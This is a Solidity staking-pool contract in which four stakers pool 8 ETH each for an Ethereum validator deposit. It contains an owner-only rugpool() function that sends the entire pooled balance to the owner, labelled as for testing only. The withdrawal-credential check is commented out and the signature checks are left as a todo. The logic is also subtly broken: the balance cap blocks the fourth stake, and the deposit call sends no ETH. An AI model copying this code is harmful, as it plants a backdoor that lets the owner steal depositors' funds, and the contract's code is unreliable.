//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/IETHlaunchpad.sol";
import "./Xedon.sol";

contract Stakingpool is Ownable {
    mapping(address => bool) private stakers;
    mapping(address => uint256) public balances;
    bool public isDeposit = false;
    uint256 pool_balances;

    IETHlaunchpad internal launchpad;
    Xedon internal token;
    bytes internal pubkey;
    bytes internal withdrawal_credentials;
    bytes internal signature;
    bytes32 internal deposit_data_root;

    event Deposit(address indexed account, uint256 amount);
    event Withdraw(address indexed account, uint256 amount);

    constructor(
        address _launchpad,
        address _token,
        bytes memory _pubkey,
        bytes memory _withdrawal_credentials,
        bytes memory _signature,
        bytes32 _deposit_data_root
    ) {
        require(_launchpad != address(0), "Invalid launchpad address");
        require(_token != address(0), "Invalid token address");
        // require(
        //     keccak256(_toWithdrawalCred(address(this))) ==
        //         keccak256(_withdrawal_credentials),
        //     "Invalid withdrawal credentials"
        // );

        // todo check pubkey , signature , deposit_data_root

        launchpad = IETHlaunchpad(_launchpad);
        token = Xedon(_token);
        pubkey = _pubkey;
        withdrawal_credentials = _withdrawal_credentials;
        signature = _signature;
        deposit_data_root = _deposit_data_root;
    }

    function stake() public payable {
        require(msg.value == 8 ether, "Amount must be equal to 8 ETH");
        require(
            address(this).balance + msg.value <= 32 ether,
            "Contract balance cannot exceed 32 ETH"
        );
        require(!stakers[msg.sender], "Already stake");

        balances[msg.sender] += msg.value;
        stakers[msg.sender] = true;
        token.mint(msg.sender);

        if (address(this).balance == 32 ether) {
            depositToLaunchpad();
        }

        emit Deposit(msg.sender, msg.value);
    }

    function _toWithdrawalCred(
        address _withdrawal
    ) private pure returns (bytes memory) {
        uint uintFromAddress = uint256(uint160(_withdrawal));
        bytes memory withdralDesired = abi.encodePacked(
            uintFromAddress +
                0x0100000000000000000000000000000000000000000000000000000000000000
        );
        return withdralDesired;
    }

    function withdraw() public {
        require(stakers[msg.sender], "Not stakers account");
        require(isDeposit, "Not deposit yet");
        address staker1 = token.ownerOf(1);
        address staker2 = token.ownerOf(2);
        address staker3 = token.ownerOf(3);
        address staker4 = token.ownerOf(4);
        uint256 amount = address(this).balance / 4;

        payable(staker1).transfer(amount);
        payable(staker2).transfer(amount);
        payable(staker3).transfer(amount);
        payable(staker4).transfer(amount);

        emit Withdraw(staker1, amount);
        emit Withdraw(staker2, amount);
        emit Withdraw(staker3, amount);
        emit Withdraw(staker4, amount);
    }

    function getUserBalance(address _adr) public view returns (uint256) {
        return balances[_adr];
    }

    function depositToLaunchpad() public {
        launchpad.deposit(
            pubkey,
            withdrawal_credentials,
            signature,
            deposit_data_root
        );
        isDeposit = true;
    }

    // This function is used for testing purpose only
    function rugpool() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}
